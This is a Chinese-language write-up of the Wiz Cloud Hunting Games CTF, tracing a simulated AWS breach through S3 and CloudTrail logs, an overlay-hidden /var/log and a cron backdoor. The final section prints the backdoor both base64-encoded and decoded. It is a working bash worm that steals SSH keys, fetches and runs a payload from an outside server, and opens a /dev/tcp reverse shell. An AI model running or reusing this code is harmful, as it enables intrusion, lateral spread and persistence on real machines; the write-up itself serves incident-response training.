---
title: "Wiz Cloud Hunting Games 挑战复盘：一条完整的云上攻击链"
description: "记录 Wiz Cloud Hunting Games CTF 的完整调查过程：从 S3 数据外泄溯源，到 CloudTrail 追踪、Overlay 日志隐藏识别，再到持久化清除。"
date: 2026-02-20
tags:
  - "CTF"
  - "云安全"
  - "AWS"
  - "CloudTrail"
  - "应急响应"
authors:
  - "bx"
draft: false
slug: "wiz-cloud-hunting-games-writeup"
---
<meta name="referrer" content="no-referrer">

# Wiz Cloud Hunting Games 挑战复盘：一条完整的云上攻击链
> 本篇文章文字经过 AI 排版整理，核心文字无变化

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771595230220-567b23ba-1d38-4518-9ce6-b426f8df4862.png)

Wiz 出的这套云安全靶场质量很高，题目串起了一条完整的攻击链，覆盖了云日志分析、身份追踪、主机取证和持久化清除。

题目入口：[The Cloud Hunting Games CTF](https://www.cloudhuntinggames.com/)

故事背景是 ExfilCola 遭遇勒索，攻击者声称已经窃取了配方数据。我们的目标是沿着日志与主机痕迹完成追踪与处置。

![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771595358377-33e7697e-ed9d-473e-a8bd-c86444a98526.png)

## 最终答案速览

| Challenge | 关键答案 |
| --- | --- |
| One | `arn:aws:sts::509843726190:assumed-role/S3Reader/drinks` |
| Two | `arn:aws:iam::509843726190:user/Moe.Jito` |
| Three | `i-0a44002eec2f16c25` |
| Four | `102.54.197.238` |
| Five | 删除 `34.118.239.100/files/ExfilCola-Top-Secret.txt` 成功 |

## CHALLENGE One Ain't no data when she's gone
> FizzShadows claim that they were able to exfiltrate ExfilCola's secret recipes. You have to validate this claim before considering any further steps.
>
> All ExfilCola's secret recipes are stored in a secured S3 bucket. Luckily, their security team was responsible enough to make sure that S3 data events were collected. You've been granted access to these logs, which are available in the s3_data_events table.
>
> Go ahead and see if there are any traces of exfiltration: find the IAM role involved in the attack.
>
> 翻译一下就是：
>
> FizzShadows 声称他们成功窃取了 ExfilCola 的秘密配方。在考虑采取进一步行动之前，你必须先验证这一说法。
>
> ExfilCola 的所有秘密配方都存储在一个受保护的 S3 存储桶中。幸运的是，他们的安全团队足够负责，确保已收集 S3 数据事件。你已被授予访问这些日志的权限，这些日志可在 `s3_data_events` 表中查看。
>
> 请继续检查是否存在数据外泄的痕迹：找出参与此次攻击的 IAM 角色。
>

先看一下表的结构

```python
SELECT * FROM s3_data_events LIMIT 5;
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771589669009-a3fe6a58-3978-4c00-87e4-34237115bf39.png)

既然本本题围绕“recipe”这个为主题，我们模糊匹配 Pah 中这个的出现，肯定是采用“GetObject”动作

```sql
SELECT useridentity_ARN FROM s3_data_events 
WHERE (path LIKE '%recipe%' OR requestParameters LIKE '%recipe%') 
AND eventname = 'GetObject';
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771590613417-64e1e76f-6b07-42df-8b5c-9aabe8cf76e4.png)

但是有四条，其实这里就能确定是最后一个了，但是我们也可以看一下 useragent

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771590757989-8ffa4ee7-ca9b-45a8-8c62-c1d4d8c90e57.png)

最后锁定这个 boto3 必然无疑了

```python
arn:aws:sts::509843726190:assumed-role/S3Reader/drinks
```

next one



## CHALLENGE Two Follow, follow the trail
> So you have managed to validate FizzShadows' claim and track the IAM role that has exfiltrated ExfilCola's recipe. You've been granted access to the cloudtrail table. Follow the trail of the S3Reader. Who used it?
>
> 现在你已经成功验证了 FizzShadows 的说法，并找出了窃取 ExfilCola 配方的 IAM 角色。你已被授予访问 `cloudtrail` 表的权限。
>
> 请沿着 **S3Reader** 的踪迹继续追查。是谁使用了它？
>

其实整体逻辑是这样的

攻击者本身并不是这个 Role，而是“某个人”或者“某个实体”通过调用了 AWS STS 的 `AssumeRole` API，扮演成了这个 `S3Reader` 角色

现在我们手握 `cloudtrail`的访问权限，我们需要去查：到底是谁（哪个原始 ARN）申请扮演了 `S3Reader`



根据上文分析，我们提取两个关键词“S3Reader”，“drinks”

编写成下列语句，并且我们需要查询的动作是“AssumeRole”

```sql
SELECT 
    userIdentity_ARN, 
    eventName, 
    requestParameters 
FROM cloudtrail 
WHERE eventName = 'AssumeRole' 
AND requestParameters LIKE '%S3Reader%' AND requestParameters LIKE "%drinks%";
```

结果如下

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771591338472-23c3d2ec-0758-4742-a112-968b4d474c38.png)

```python
arn:aws:iam::509843726190:user/Moe.Jito
```

直接锁定这个“Moe.Jito”





## CHALLENGE Three Deeper into the trail
> Bingo — you've tracked down the compromised IAM user: Moe.Jito. Keep digging through the CloudTrail logs.
>
> Follow the attacker's footsteps and find the machine that was compromised and leveraged for lateral movement.
>
> 宾果——你已经追踪到了被攻陷的 IAM 用户：**Moe.Jito**。继续深入挖掘 CloudTrail 日志。
>
> 沿着攻击者的行动轨迹继续追踪，找出那台被入侵并被用来进行横向移动的机器。
>



这个题尝试很多东西，最开始去追踪这个 ip 但是无果

整体逻辑是这样的

当我们执行 `WHERE eventname like 'Update%'` 时，会把所有“修改配置”、“更新代码”的高危 API 调用全部拉出来

```sql
SELECT 
    eventTime, 
    eventName, 
    userIdentity_ARN
FROM cloudtrail 
WHERE eventname like 'Update%';
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771592584160-4810320f-35b3-41fd-a5e6-b23092fce393.png)

可以发现这样一个事件的存在，它在修改 aws 的 lamda 函数

```sql
arn:aws:sts::509843726190:assumed-role/lambdaWorker/i-0a44002eec2f16c25

i-0a44002eec2f16c25
```



## CHALLENGE Four <font style="color:rgb(31, 31, 31);">Ain't no mountain high enough to keep me away from my logs</font>
> Great progress! As you continue your investigation, you discover that once the attacker compromised the EC2 machine, they were able to manipulate a Lambda function to gain access to multiple IAM users. ExfilCola has granted you root access to the EC2 machine where this activity originated from. But the question remains - how did the attacker gain access to this machine? Your task is to find the IP address of another ExfilCola workload that was used as the initial entry point into the organization.
>
> 进展非常顺利！随着你继续调查，你发现攻击者在攻陷 EC2 机器后，操纵了一个 Lambda 函数，从而获得了多个 IAM 用户的访问权限。ExfilCola 已授予你对这台发生相关活动的 EC2 机器的 root 访问权限。
>
> 但问题仍然存在——攻击者是如何获得这台机器的访问权限的？
>
> 你的任务是找出另一个 ExfilCola 工作负载的 IP 地址，该工作负载被用作入侵组织的初始入口点。
>

_这个第四部分就上难度了，使用了一个叫做 overlay 的技术去掩盖作案日志_

_一般攻击清除痕迹就是利用_

```sql
rm -rf /var/log/*
```

_但这种做法太粗暴了，不仅无法恢复，而且很容易触发安全软件的“文件完整性监控”告警_

_具体原理总结如下：_

_**“挂载覆盖”（Mount Shadowing / OverlayFS）**__ 的系统级障眼法：_

+ _**原理：**__ 在 Linux 中，你可以把一个空的文件系统（比如放在内存里的 _`_tmpfs_`_），直接 _`_mount_`_（挂载）到现有的目录上。_
+ _**打个比方：**_`_/var/log_`_ 就像是一张写满了黑客犯罪记录的纸。黑客没有拿橡皮去擦掉字，而是拿了一张全新的白纸，__**盖在了**__原来的纸上面。_
+ _当你尝试读取 _`_/var/log_`_ 时，操作系统只会让你看到最上面的那层“白纸”，底下的真实日志文件依然完好无损地躺在硬盘里，只是暂时被“屏蔽”了。_





给了一个终端 root 权限，可以先看一下日志，没有发现任何东西

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771593030123-546ea77a-7266-4e77-8116-261d51f2420b.png)

使用了 overlay 技术，unmount 一下

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771593088587-00c57977-6bbd-4bd8-a59a-ad50378d5312.png)

解除挂载之后，重新审查/var/log 文件夹发现就可以本身文件，继续审查 auth.log

查询这个 sshd 连接记录

```sql
cat /var/log/auth.log | grep sshd
```

审计的时候条目很多，很长时间都会注意到这个postgresql-user，这个就是比较可疑的，psql 这个服务不应该利用 ssh 的

> Linux 系统中有许多默认用于运行后台服务（如 `postgresql-user`, `nginx`, `nobody`）的账号。这些账号为了安全，通常被剥夺了交互式登录权限（Shell 设为 `/usr/sbin/nologin`）
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771593223929-0f8466ee-e80c-4814-a5ae-0375bac2589a.png)

提交这个 ip

```sql
102.54.197.238
```





## CHALLENGE Five Now you're just somebody that I used to log
> Wow, you rock! Now you know that the attacker has laterally moved from a workload within the organization to a high privileged machine, ssh-fetcher, via SSH. ExfilCola has granted you root access to the PostgreSQL service where this activity originated from.
>
> ExfilCola really doesn't want to pay the ransom but can't afford for the secret recipe to be published. Can you save the day?
>
> It seems like the attacker is persistent — literally...
>
> Delete the secret recipe from the attacker's server.
>
> 哇，你太厉害了！现在你已经确认攻击者通过 SSH 从组织内部的某个工作负载横向移动到了一个高权限机器 **ssh-fetcher**。ExfilCola 已授予你对发生该活动的 PostgreSQL 服务的 root 访问权限。
>
> ExfilCola 真的不想支付赎金，但他们也无法承担秘密配方被公开的风险。你能拯救局面吗？
>
> 看起来攻击者相当“持久”——字面意义上的那种……
>
> 删除攻击者服务器上的秘密配方。
>

这个描述提示就是，这个机子上做了持久化，其实就可以直接找定时任务了

系统级别，没什么发现

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771594672283-d019ad0e-1a50-4040-a025-5360b2af8b70.png)

接着，由于是 Ubuntu 系统，我们

```bash
ls /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/postgres
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771594652002-e5fd23c8-fad9-4dd6-9c9d-9b3830526c8f.png)

文件内容

```bash
echo "IyEvYmluL2Jhc2gNCg0KIyBMaXN0IG9mIGludGVyZXN0aW5nIHBvbGljaWVzDQpWVUxORVJBQkxF
X1BPTElDSUVTPSgiQWRtaW5pc3RyYXRvckFjY2VzcyIgIlBvd2VyVXNlckFjY2VzcyIgIkFtYXpv
blMzRnVsbEFjY2VzcyIgIklBTUZ1bGxBY2Nlc3MiICJBV1NMYW1iZGFGdWxsQWNjZXNzIiAiQVdT
TGFtYmRhX0Z1bGxBY2Nlc3MiKQ0KDQpTRVJWRVI9IjM0LjExOC4yMzkuMTAwIg0KUE9SVD00NDQ0
DQpVU0VSTkFNRT0iRml6elNoYWRvd3NfMSINClBBU1NXT1JEPSJHeDI3cFF3ejkyUmsiDQpDUkVE
RU5USUFMU19GSUxFPSIvdG1wL2MiDQoNClNDUklQVF9QQVRIPSIkKGNkIC0tICIkKGRpcm5hbWUg
LS0gIiR7QkFTSF9TT1VSQ0VbMF19IikiICY+L2Rldi9udWxsICYmIHB3ZCkvJChiYXNlbmFtZSAt
LSAiJHtCQVNIX1NPVVJDRVswXX0iKSINCg0KIyBDaGVjayBpZiBhIGNvbW1hbmQgZXhpc3RzDQpj
aGVja19jb21tYW5kKCkgew0KICAgIGlmICEgY29tbWFuZCAtdiAiJDEiICY+IC9kZXYvbnVsbDsg
dGhlbg0KICAgICAgICBpbnN0YWxsX2RlcGVuZGVuY3kgIiQxIg0KICAgIGZpDQp9DQoNCiMgSW5z
dGFsbCBtaXNzaW5nIGRlcGVuZGVuY2llcw0KaW5zdGFsbF9kZXBlbmRlbmN5KCkgew0KICAgIGxv
Y2FsIHBhY2thZ2U9IiQxIg0KICAgIGlmIFtbICIkcGFja2FnZSIgPT0gImN1cmwiIF1dOyB0aGVu
DQogICAgICAgIGFwdC1nZXQgaW5zdGFsbCBjdXJsIC15ICY+IC9kZXYvbnVsbA0KICAgICAgICAg
ICAgICAgIHl1bSBpbnN0YWxsIGN1cmwgLXkgJj4gL2Rldi9udWxsDQogICAgZWxpZiBbWyAiJHBh
Y2thZ2UiID09ICJ1bnppcCIgXV07IHRoZW4NCiAgICAgICAgYXB0LWdldCBpbnN0YWxsIHVuemlw
IC15ICY+IC9kZXYvbnVsbA0KICAgICAgICAgICAgICAgIHl1bSBpbnN0YWxsIHVuemlwIC15ICY+
IC9kZXYvbnVsbA0KICAgIGVsaWYgW1sgIiRwYWNrYWdlIiA9PSAiYXdzIiBdXTsgdGhlbg0KICAg
ICAgICBpbnN0YWxsX2F3c19jbGkNCiAgICBmaQ0KfQ0KDQojIEluc3RhbGwgQVdTIENMSSBsb2Nh
bGx5DQppbnN0YWxsX2F3c19jbGkoKSB7DQogICAgbWtkaXIgLXAgIiRIT01FLy5hd3MtY2xpIg0K
ICAgIGN1cmwgLXMgImh0dHBzOi8vYXdzY2xpLmFtYXpvbmF3cy5jb20vYXdzY2xpLWV4ZS1saW51
eC14ODZfNjQuemlwIiAtbyAiJEhPTUUvLmF3cy1jbGkvYXdzY2xpdjIuemlwIg0KDQogICAgdW56
aXAgLXEgIiRIT01FLy5hd3MtY2xpL2F3c2NsaXYyLnppcCIgLWQgIiRIT01FLy5hd3MtY2xpLyIN
Cg0KICAgICIkSE9NRS8uYXdzLWNsaS9hd3MvaW5zdGFsbCIgLS1pbnN0YWxsLWRpciAiJEhPTUUv
LmF3cy1jbGkvYmluIiAtLWJpbi1kaXIgIiRIT01FLy5hd3MtY2xpL2JpbiINCg0KICAgICMgQWRk
IEFXUyBDTEkgdG8gUEFUSA0KICAgIGV4cG9ydCBQQVRIPSIkSE9NRS8uYXdzLWNsaS9iaW46JFBB
VEgiDQogICAgZWNobyAnZXhwb3J0IFBBVEg9IiRIT01FLy5hd3MtY2xpL2JpbjokUEFUSCInID4+
ICIkSE9NRS8uYmFzaHJjIg0KfQ0KDQoNCiMgVHJ5IHRvIHNwcmVhZA0Kc3ByZWFkX3NzaCgpIHsN
CiAgICBmaW5kX2FuZF9leGVjdXRlKCkgew0KICAgICAgICBsb2NhbCBLRVlTPSQoZmluZCB+LyAv
cm9vdCAvaG9tZSAtbWF4ZGVwdGggNSAtbmFtZSAnaWRfcnNhKicgfCBncmVwIC12dyBwdWI7DQog
ICAgICAgICAgICAgICAgICAgICBncmVwIElkZW50aXR5RmlsZSB+Ly5zc2gvY29uZmlnIC9ob21l
LyovLnNzaC9jb25maWcgL3Jvb3QvLnNzaC9jb25maWcgMj4vZGV2L251bGwgfCBhd2sgJ3twcmlu
dCAkMn0nOw0KICAgICAgICAgICAgICAgICAgICAgZmluZCB+LyAvcm9vdCAvaG9tZSAtbWF4ZGVw
dGggNSAtbmFtZSAnKi5wZW0nIHwgc29ydCAtdSkNCg0KICAgICAgICBsb2NhbCBIT1NUUz0kKGdy
ZXAgSG9zdE5hbWUgfi8uc3NoL2NvbmZpZyAvaG9tZS8qLy5zc2gvY29uZmlnIC9yb290Ly5zc2gv
Y29uZmlnIDI+L2Rldi9udWxsIHwgYXdrICd7cHJpbnQgJDJ9JzsNCiAgICAgICAgICAgICAgICAg
ICAgICBncmVwIC1FICIoc3NofHNjcCkiIH4vLmJhc2hfaGlzdG9yeSAvaG9tZS8qLy5iYXNoX2hp
c3RvcnkgL3Jvb3QvLmJhc2hfaGlzdG9yeSAyPi9kZXYvbnVsbCB8IGdyZXAgLW9QICIoWzAtOV17
MSwzfVwuKXszfVswLTldezEsM318XGIoPzpbYS16QS1aMC05LV0rXC4pK1thLXpBLVpdezIsfVxi
IjsNCiAgICAgICAgICAgICAgICAgICAgICBncmVwIC1vUCAiKFswLTldezEsM31cLil7M31bMC05
XXsxLDN9fFxiKD86W2EtekEtWjAtOS1dK1wuKStbYS16QS1aXXsyLH1cYiIgfi8qLy5zc2gva25v
d25faG9zdHMgL2hvbWUvKi8uc3NoL2tub3duX2hvc3RzIC9yb290Ly5zc2gva25vd25faG9zdHMg
Mj4vZGV2L251bGwgfA0KICAgICAgICAgICAgICAgICAgICAgIGdyZXAgLXZ3IDEyNy4wLjAuMSB8
IHNvcnQgLXUpDQoNCiAgICAgICAgbG9jYWwgVVNFUlM9JChlY2hvICJyb290IjsNCiAgICAgICAg
ICAgICAgICAgICAgICBmaW5kIH4vIC9yb290IC9ob21lIC1tYXhkZXB0aCAyIC1uYW1lICcuc3No
JyB8IHhhcmdzIC1JIHt9IGZpbmQge30gLW5hbWUgJ2lkX3JzYScgfCBhd2sgLUYnLycgJ3twcmlu
dCAkM30nIHwgZ3JlcCAtdiAiLnNzaCIgfCBzb3J0IC11KQ0KDQogICAgICAgZm9yIGtleSBpbiAk
S0VZUzsgZG8NCiAgICAgICAgICAgIGNobW9kIDQwMCAiJGtleSINCiAgICAgICAgICAgIGZvciB1
c2VyIGluICRVU0VSUzsgZG8NCg0KICAgICAgICAgICAgICBlY2hvICIkdXNlciINCiAgICAgICAg
ICAgICAgICAgICBmb3IgaG9zdCBpbiAkSE9TVFM7IGRvDQogICAgICAgICAgICAgICAgICAgICBz
c2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRp
bWVvdXQ9NSAtaSAiJGtleSIgIiR1c2VyQCRob3N0IiAiKGN1cmwgLXUgJFVTRVJOQU1FOiRQQVNT
V09SRCAtbyAvZGV2L3NobS9jb250cm9sbGVyIGh0dHA6Ly8kU0VSVkVSL2ZpbGVzL2NvbnRyb2xs
ZXIgJiYgYmFzaCAvZGV2L3NobS9jb250cm9sbGVyKSINCiAgICAgICAgICAgICAgICBkb25lDQog
ICAgICAgICAgICBkb25lDQogICAgICAgIGRvbmUNCiAgICB9DQoNCiAgICBmaW5kX2FuZF9leGVj
dXRlDQp9DQoNCmNyZWF0ZV9wZXJzaXN0ZW5jZSgpIHsNCihjcm9udGFiIC1sIDI+L2Rldi9udWxs
OyBlY2hvICIwIDAgKiAqICogYmFzaCAkU0NSSVBUX1BBVEgiKSB8IGNyb250YWIgLQ0KfQ0KDQpj
cmVhdGVfc2hlbGwgKCkgew0KICAgIGVjaG8gIkNyZWF0aW5nIGEgcmV2ZXJzZSBzaGVsbCINCiAg
ICAvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvIiRTRVJWRVIiLyIkUE9SVCIgMD4mMQ0KfQ0KDQoj
IENoZWNrIHJvbGUgcG9saWNpZXMNCmNoZWNrX3JvbGVfdnVsbigpIHsNCiAgICBsb2NhbCBST0xF
X05BTUU9JChhd3Mgc3RzIGdldC1jYWxsZXItaWRlbnRpdHkgLS1xdWVyeSAiQXJuIiAtLW91dHB1
dCB0ZXh0IHwgYXdrIC1GJy8nICd7cHJpbnQgJDJ9JykNCg0KICAgICMgTGlzdCBhdHRhY2hlZCBw
b2xpY2llcyBmb3IgdGhlIGdpdmVuIHJvbGUNCiAgICBhdHRhY2hlZF9wb2xpY2llcz0kKGF3cyBp
YW0gbGlzdC1hdHRhY2hlZC1yb2xlLXBvbGljaWVzIC0tcm9sZS1uYW1lICIkUk9MRV9OQU1FIiAt
LXF1ZXJ5ICdBdHRhY2hlZFBvbGljaWVzWypdLlBvbGljeU5hbWUnIC0tb3V0cHV0IHRleHQpDQoN
CiAgICAjIENoZWNrIGlmIHRoZSB1c2VyIGhhcyBJQU0gcGVybWlzc2lvbnMgdG8gbGlzdCBwb2xp
Y2llcw0KICAgIGlmIFtbICQ/IC1lcSAwIF1dOyB0aGVuDQogICAgICAgICMgSWYgdGhlIHVzZXIg
aGFzIElBTSBwZXJtaXNzaW9ucywgY2hlY2sgYXR0YWNoZWQgcG9saWNpZXMNCiAgICAgICAgYXR0
YWNoZWRfcG9saWNpZXNfYXJyYXk9KCRhdHRhY2hlZF9wb2xpY2llcykNCiAgICAgICAgZm9yIHBv
bGljeSBpbiAiJHthdHRhY2hlZF9wb2xpY2llc19hcnJheVtAXX0iOyBkbw0KICAgICAgICAgICAg
Zm9yIHZ1bG5fcG9saWN5IGluICIke1ZVTE5FUkFCTEVfUE9MSUNJRVNbQF19IjsgZG8NCiAgICAg
ICAgICAgICAgICBpZiBbWyAiJHBvbGljeSIgPT0gIiR2dWxuX3BvbGljeSIgXV07IHRoZW4NCiAg
ICAgICAgICAgICAgICAgICAgcmV0dXJuIDANCiAgICAgICAgICAgICAgICBmaQ0KICAgICAgICAg
ICAgZG9uZQ0KICAgICAgICBkb25lDQogICAgZWxzZQ0KICAgICAgICBhd3MgczMgbHMNCiAgICAg
ICAgaWYgW1sgJD8gLWVxIDAgXV07IHRoZW4NCiAgICAgICAgICAgIHJldHVybiAwDQogICAgICAg
IGVsc2UNCiAgICAgICAgICAgIGF3cyBsYW1iZGEgbGlzdC1mdW5jdGlvbnMNCiAgICAgICAgICAg
IGlmIFtbICQ/IC1lcSAwIF1dOyB0aGVuDQogICAgICAgICAgICAgICAgcmV0dXJuIDANCiAgICAg
ICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICByZXR1cm4gMQ0KICAgICAgICAgICAgZmkNCiAg
ICAgICAgZmkNCiAgICBmaQ0KfQ0KDQojIENoZWNrIHJlcXVpcmVkIGRlcGVuZGVuY2llcw0KY2hl
Y2tfY29tbWFuZCAiY3VybCINCmNoZWNrX2NvbW1hbmQgInVuemlwIg0KY2hlY2tfY29tbWFuZCAi
YXdzIg0KDQpjaGVja19yb2xlX3Z1bG4NCmlmIFtbICQ/IC1lcSAwIF1dOyB0aGVuDQogICAgICAg
IGNyZWF0ZV9zaGVsbA0KZWxzZQ0KICAgICAgICBjcmVhdGVfcGVyc2lzdGVuY2UNCiAgICAgICAg
c3ByZWFkX3NzaA0KCWNhdCAvZGV2L251bGwgPiB+Ly5iYXNoX2hpc3RvcnkNCmZpDQo=" | base64 -d | bash
```

解码就是

```sql
#!/bin/bash

# List of interesting policies
VULNERABLE_POLICIES=("AdministratorAccess" "PowerUserAccess" "AmazonS3FullAccess" "IAMFullAccess" "AWSLambdaFullAccess" "AWSLambda_FullAccess")

SERVER="34.118.239.100"
PORT=4444
USERNAME="FizzShadows_1"
PASSWORD="Gx27pQwz92Rk"
CREDENTIALS_FILE="/tmp/c"

SCRIPT_PATH="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &>/dev/null && pwd)/$(basename -- "${BASH_SOURCE[0]}")"

# Check if a command exists
check_command() {
    if ! command -v "$1" &> /dev/null; then
        install_dependency "$1"
    fi
}

# Install missing dependencies
install_dependency() {
    local package="$1"
    if [[ "$package" == "curl" ]]; then
        apt-get install curl -y &> /dev/null
                yum install curl -y &> /dev/null
    elif [[ "$package" == "unzip" ]]; then
        apt-get install unzip -y &> /dev/null
                yum install unzip -y &> /dev/null
    elif [[ "$package" == "aws" ]]; then
        install_aws_cli
    fi
}

# Install AWS CLI locally
install_aws_cli() {
    mkdir -p "$HOME/.aws-cli"
    curl -s "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "$HOME/.aws-cli/awscliv2.zip"

    unzip -q "$HOME/.aws-cli/awscliv2.zip" -d "$HOME/.aws-cli/"

    "$HOME/.aws-cli/aws/install" --install-dir "$HOME/.aws-cli/bin" --bin-dir "$HOME/.aws-cli/bin"

    # Add AWS CLI to PATH
    export PATH="$HOME/.aws-cli/bin:$PATH"
    echo 'export PATH="$HOME/.aws-cli/bin:$PATH"' >> "$HOME/.bashrc"
}


# Try to spread
spread_ssh() {
    find_and_execute() {
        local KEYS=$(find ~/ /root /home -maxdepth 5 -name 'id_rsa*' | grep -vw pub;
                     grep IdentityFile ~/.ssh/config /home/*/.ssh/config /root/.ssh/config 2>/dev/null | awk '{print $2}';
                     find ~/ /root /home -maxdepth 5 -name '*.pem' | sort -u)

        local HOSTS=$(grep HostName ~/.ssh/config /home/*/.ssh/config /root/.ssh/config 2>/dev/null | awk '{print $2}';
                      grep -E "(ssh|scp)" ~/.bash_history /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}|\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b";
                      grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}|\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b" ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null |
                      grep -vw 127.0.0.1 | sort -u)

        local USERS=$(echo "root";
                      find ~/ /root /home -maxdepth 2 -name '.ssh' | xargs -I {} find {} -name 'id_rsa' | awk -F'/' '{print $3}' | grep -v ".ssh" | sort -u)

       for key in $KEYS; do
            chmod 400 "$key"
            for user in $USERS; do

              echo "$user"
                   for host in $HOSTS; do
                     ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i "$key" "$user@$host" "(curl -u $USERNAME:$PASSWORD -o /dev/shm/controller http://$SERVER/files/controller && bash /dev/shm/controller)"
                done
            done
        done
    }

    find_and_execute
}

create_persistence() {
(crontab -l 2>/dev/null; echo "0 0 * * * bash $SCRIPT_PATH") | crontab -
}

create_shell () {
    echo "Creating a reverse shell"
    /bin/bash -i >& /dev/tcp/"$SERVER"/"$PORT" 0>&1
}

# Check role policies
check_role_vuln() {
    local ROLE_NAME=$(aws sts get-caller-identity --query "Arn" --output text | awk -F'/' '{print $2}')

    # List attached policies for the given role
    attached_policies=$(aws iam list-attached-role-policies --role-name "$ROLE_NAME" --query 'AttachedPolicies[*].PolicyName' --output text)

    # Check if the user has IAM permissions to list policies
    if [[ $? -eq 0 ]]; then
        # If the user has IAM permissions, check attached policies
        attached_policies_array=($attached_policies)
        for policy in "${attached_policies_array[@]}"; do
            for vuln_policy in "${VULNERABLE_POLICIES[@]}"; do
                if [[ "$policy" == "$vuln_policy" ]]; then
                    return 0
                fi
            done
        done
    else
        aws s3 ls
        if [[ $? -eq 0 ]]; then
            return 0
        else
            aws lambda list-functions
            if [[ $? -eq 0 ]]; then
                return 0
            else
                return 1
            fi
        fi
    fi
}

# Check required dependencies
check_command "curl"
check_command "unzip"
check_command "aws"

check_role_vuln
if [[ $? -eq 0 ]]; then
        create_shell
else
        create_persistence
        spread_ssh
	cat /dev/null > ~/.bash_history
fi
```

一些机密信息：

+ 攻击者控制的服务器 IP: `34.118.239.100`
+ 认证凭据: `FizzShadows_1:Gx27pQwz92Rk`
+ 机密文件在黑客服务器上的路径: `/files/ExfilCola-Top-Secret.txt`

最终删除命令如下

```sql
root@postgresql-service:~# curl -X DELETE -kv 34.118.239.100/files/ExfilCola-Top-Secret.txt -u "FizzShadows_1:Gx27pQwz92Rk"
*   Trying 34.118.239.100:80...
* Connected to 34.118.239.100 (34.118.239.100) port 80 (#0)
* Server auth using Basic with user 'FizzShadows_1'
> DELETE /files/ExfilCola-Top-Secret.txt HTTP/1.1
> Host: 34.118.239.100
> Authorization: Basic Rml6elNoYWRvd3NfMTpHeDI3cFF3ejkyUms=
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< date: Fri, 20 Feb 2026 13:43:05 GMT
< server: uvicorn
< content-length: 109
< content-type: text/plain; charset=utf-8
< 
Success! You've deleted the secret recipe before it could be exposed. The flag is: {I know it when I see it}
* Connection #0 to host 34.118.239.100 left intact
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771595095946-8a053c28-6c9d-409b-af41-664814347143.png)

到这里也是顺利通关了

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/42994824/1771595138015-0297eb1f-3644-447e-a3dd-0ceef47f7039.png)





## 总结
### 云控制平面
控制平面 vs. 数据平面

+ 数据平面（Data Plane）： 这是你的业务实际运行和数据实际存放的地方。比如 EC2 实例里跑着的 Nginx 进程、S3 存储桶里存着的图片文件、RDS 数据库里的表。
+ 控制平面（Control Plane）： 这是管理数据平面的那一层“大脑”。它负责创建、修改、删除和配置底层资源。比如，你点击 AWS 控制台按钮新建一台 EC2，或者通过 AWS CLI 执行命令给 S3 存储桶赋予公开访问权限，这些操作都是在与控制平面交互。



就是在云上，传统防火墙就大大被削弱了

可以理解控制平面的 API 有网就能访问，所以就是解决

1. “Who are you”
2. “What can you do”

> **云安全态势管理 (CSPM)：** 由于云资源可以被通过代码或 API 瞬间批量拉起，错误配置（Misconfiguration）极易发生。CSPM 工具的作用就是持续扫描控制平面，检查是否有“不带加密的 EBS 卷”、“全网公开暴露的 S3 存储桶”或者“没有开启 MFA 的特权账号”。
>

我们这题就是建立在 CloudTrail 之上进行应急相应的

CloudTrail 的唯一工作，就是忠实地记录下每一次 API 调用的全过程



### IAM 的角色扮演机制
也就是这个 AssumeRole

AWS 的 STS (Security Token Service) 允许实体（用户或机器）临时扮演另一个角色（Role）来获取特定权限。这是云上最常见的权限委托机制，也是黑客最爱用的“身份隐藏”手法


